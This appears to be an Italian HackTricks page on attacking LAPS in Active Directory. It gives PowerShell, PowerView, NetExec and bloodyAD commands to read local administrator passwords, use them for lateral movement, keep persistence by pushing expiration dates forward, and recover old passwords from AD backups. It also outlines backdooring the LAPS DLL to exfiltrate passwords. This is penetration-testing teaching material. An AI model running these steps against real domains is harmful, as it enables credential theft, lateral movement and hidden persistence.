# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Informazioni di base

Attualmente esistono **2 varianti di LAPS** che si possono incontrare durante un assessment:

- **Legacy Microsoft LAPS**: memorizza la password dell'amministratore locale in **`ms-Mcs-AdmPwd`** e il tempo di scadenza in **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrato in Windows dagli aggiornamenti di aprile 2023): può ancora emulare la modalità legacy, ma in modalità nativa utilizza gli attributi **`msLAPS-*`**, supporta la **crittografia delle password**, la **cronologia delle password** e il **backup della password DSRM** per i domain controller.

LAPS è progettato per gestire le **password degli amministratori locali**, rendendole **uniche, casuali e modificate frequentemente** sui computer aggiunti al dominio. Se puoi leggere tali attributi, di solito puoi effettuare il **pivot come amministratore locale** verso l'host interessato. In molti ambienti, l'aspetto interessante non è soltanto leggere la password, ma anche individuare **a chi è stato delegato l'accesso** agli attributi della password.

### Attributi Legacy Microsoft LAPS

Negli oggetti computer del dominio, l'implementazione di Legacy Microsoft LAPS comporta l'aggiunta di due attributi:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **password dell'amministratore in chiaro**
- **`ms-Mcs-AdmPwdExpirationTime`**: **tempo di scadenza della password**

### Attributi Windows LAPS

Windows LAPS nativo aggiunge diversi nuovi attributi agli oggetti computer:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob della password in chiaro memorizzato come JSON quando la crittografia non è abilitata
- **`msLAPS-PasswordExpirationTime`**: tempo di scadenza pianificato
- **`msLAPS-EncryptedPassword`**: password corrente crittografata
- **`msLAPS-EncryptedPasswordHistory`**: cronologia delle password crittografata
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: dati della password DSRM crittografati per i domain controller
- **`msLAPS-CurrentPasswordVersion`**: tracciamento della versione basato su GUID, utilizzato dalla logica più recente di rilevamento dei rollback (schema della foresta di Windows Server 2025)

Quando **`msLAPS-Password`** è leggibile, il valore è un oggetto JSON contenente il nome dell'account, l'ora dell'aggiornamento e la password in chiaro, ad esempio:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Verifica se attivato
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Accesso alla password LAPS

Puoi **scaricare la policy LAPS raw** da `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` e poi usare **`Parse-PolFile`** dal pacchetto [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) per convertire questo file in un formato leggibile.

### Cmdlet PowerShell legacy di Microsoft LAPS

Se il modulo LAPS legacy è installato, di solito sono disponibili i seguenti cmdlet:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Cmdlet PowerShell di Windows LAPS

Windows LAPS nativo include un nuovo modulo PowerShell e nuovi cmdlet:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Alcuni dettagli operativi sono importanti:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** gestisce automaticamente **legacy LAPS**, **clear-text Windows LAPS** ed **encrypted Windows LAPS**.
- Se la password è encrypted e puoi **leggerla** ma non **decrittarla**, il cmdlet restituisce metadati come **`Source`**, **`DecryptionStatus`** e **`AuthorizedDecryptor`** anche quando non può restituire la password in clear-text.
- In **encrypted Windows LAPS**, il **permesso di lettura** e il **permesso di decrittazione** sono **controlli distinti**. Avere accesso in lettura all'OU / all'oggetto non significa automaticamente poter decrittare **`msLAPS-EncryptedPassword`**.
- La **cronologia delle password** è disponibile solo quando la **Windows LAPS encryption** è abilitata.
- Sui domain controller, la source restituita può essere **`EncryptedDSRMPassword`**.

Questo è utile durante un assessment perché il campo **`AuthorizedDecryptor`** indica **per quale user o group è stato encrypted il blob**, trasformando spesso una lettura della password fallita in un nuovo target di **privilege escalation**.

### PowerView / LDAP

**PowerView** può essere utilizzato anche per scoprire **chi può leggere la password e leggerla**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Se **`msLAPS-Password`** è leggibile, analizza il JSON restituito ed estrai **`p`** per la password e **`n`** per il nome dell'account amministratore locale gestito.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Quel campo **`n`** è importante nelle implementazioni più recenti perché la **gestione automatica degli account di Windows LAPS** può scegliere un **account personalizzato** invece dell'**`Administrator`** integrato e i sistemi più recenti **Windows 11 24H2 / Windows Server 2025** possono persino **randomizzare** il nome di tale account.<sup>[[4]](#references)</sup>

### Linux / strumenti remoti

Gli strumenti moderni supportano sia Microsoft LAPS legacy sia Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Note:

- Le build recenti di **NetExec** supportano **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** e **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** è ancora utile per il **Microsoft LAPS** legacy da Linux, ma supporta solo **`ms-Mcs-AdmPwd`**.
- I tool cross-platform più recenti, come **`LAPS4LINUX`**, i tool basati su **`dpapi-ng`** e i workflow recenti di **NetExec**, possono gestire anche il **Windows LAPS** nativo da host non Windows.
- Se l'ambiente utilizza il **Windows LAPS** con password cifrate, una semplice lettura LDAP non è sufficiente; è inoltre necessario essere un **decryptor autorizzato** (o disporre di materiale di decrittazione equivalente, come il materiale della root key DPAPI-NG del dominio offline).<sup>[[5]](#references)</sup>
- Su **Windows 11 24H2 / Windows Server 2025**, non bisogna presumere che l'admin locale gestito sia sempre **`Administrator`**. La gestione automatica degli account può creare un account personalizzato e randomizzarne facoltativamente il nome; quindi bisogna prima individuare il nome dell'account tramite **`n`** / **`Account`** prima di utilizzare **`--laps`** su larga scala.<sup>[[4]](#references)</sup>

### Abuso della sincronizzazione delle directory

Se si dispone dei diritti di **directory synchronization** a livello di dominio invece dell'accesso diretto in lettura su ogni computer object, LAPS può comunque essere interessante.

La combinazione di **`DS-Replication-Get-Changes`** con **`DS-Replication-Get-Changes-In-Filtered-Set`** o **`DS-Replication-Get-Changes-All`** può essere utilizzata per sincronizzare gli attributi **confidential / RODC-filtered**, come il legacy **`ms-Mcs-AdmPwd`**. BloodHound lo modella come **`SyncLAPSPassword`**. Consulta [DCSync](dcsync.md) per il contesto relativo ai replication rights.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita l'enumeration di LAPS tramite diverse funzioni.<sup>[[6]](#references)</sup>\
Una di queste consiste nell'analizzare **`ExtendedRights`** per **tutti i computer con LAPS abilitato.** Questo mostra i **gruppi** a cui è stata assegnata esplicitamente la possibilità di **leggere le password LAPS**, spesso utenti appartenenti a gruppi protetti.\
Un **account** che ha **aggiunto un computer** a un dominio riceve `All Extended Rights` su quell'host, e questo diritto consente all'**account** di **leggere le password**. L'enumeration può mostrare un account utente in grado di leggere la password LAPS su un host. Questo può aiutarci a **puntare a utenti AD specifici** che possono leggere le password LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Dumping delle password LAPS con NetExec / CrackMapExec

Se non disponi di una PowerShell interattiva, puoi sfruttare questo privilegio da remoto tramite LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Questo estrae tutti i secret LAPS che l'utente può leggere, consentendoti di eseguire il lateral movement utilizzando una password di amministratore locale diversa.

## Utilizzo della password LAPS
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistenza di LAPS

### Data di scadenza

Una volta ottenuti i privilegi di **admin**, è possibile **ottenere le password** e **impedire** a una macchina di **aggiornare** la propria **password** **impostando la data di scadenza nel futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Il LAPS nativo di Windows utilizza invece **`msLAPS-PasswordExpirationTime`**:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> La password continuerà comunque a ruotare se un **admin** usa **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, oppure se è abilitata l'opzione **Do not allow password expiration time longer than required by policy**.

### Avvertenza sul rollback di snapshot nelle versioni più recenti di Windows LAPS

I vecchi trucchi basati sul rollback di snapshot / immagini sono **meno affidabili** contro le distribuzioni recenti di **Windows LAPS**. Su **Windows 11 24H2 / Windows Server 2025**, se lo schema della foresta include **`msLAPS-CurrentPasswordVersion`** (**schema della foresta Windows Server 2025**), il client confronta un GUID memorizzato localmente nella cache con il valore archiviato in AD e **ruota immediatamente la password** quando un rollback crea uno **stato incoerente**.

In pratica, ciò significa che la persistenza basata su snapshot o i tentativi di ripristinare una vecchia password dell'admin locale conosciuta possono fallire rapidamente invece di sopravvivere fino alla successiva scadenza normale.<sup>[[2]](#references)</sup>

Questa protezione si applica solo a **Windows LAPS con backend AD** e dipende comunque dalla possibilità per la macchina ripristinata di **autenticarsi nuovamente verso AD**. Se la macchina non riesce più a comunicare con AD, la **cronologia delle password** o l'**accesso al backup di AD** potrebbero ancora essere utili.

### Avvertenza sulla manomissione della gestione automatica dell'account

Quando la **gestione automatica dell'account** è abilitata, Windows LAPS gestisce il ciclo di vita dell'account admin locale gestito. I tentativi imprevisti di rinominare, riconfigurare o altrimenti manomettere tale account possono essere rifiutati con **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**; di conseguenza, la persistenza che dipende dalla modifica silenziosa dell'account LAPS gestito è meno affidabile sugli endpoint più recenti.<sup>[[4]](#references)</sup>

### Recupero delle password storiche dai backup di AD

Quando sono abilitate **crittografia di Windows LAPS + cronologia delle password**, i backup di AD montati possono diventare un'ulteriore fonte di segreti. Se puoi accedere a uno snapshot AD montato e usare la **modalità di ripristino**, puoi interrogare le password archiviate precedenti senza comunicare con un DC attivo.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Questo è principalmente rilevante durante il **furto di backup AD**, l'**abuso della computer forensics offline** o l'**accesso ai supporti di disaster recovery**.

### Backdoor

Il codice sorgente originale per Microsoft LAPS legacy è disponibile [qui](https://github.com/GreyCorbel/admpwd), pertanto è possibile inserire una backdoor nel codice (ad esempio all'interno del metodo `Get-AdmPwdPassword` in `Main/AdmPwd.PS/Main.cs`) che in qualche modo **esfiltri le nuove password o le memorizzi da qualche parte**.

Quindi, compila il nuovo `AdmPwd.PS.dll` e caricalo sulla macchina in `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (modificando anche l'orario di modifica).

## Riferimenti

- [1] [Introduzione a Microsoft LAPS – Local Administrator Password Solution](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Estensioni dello schema e dei diritti di Windows LAPS per Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Iniziare a usare Windows LAPS e Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Modalità di gestione degli account di Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [LAPS 2.0 Internals - XPN Infosec Blog](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
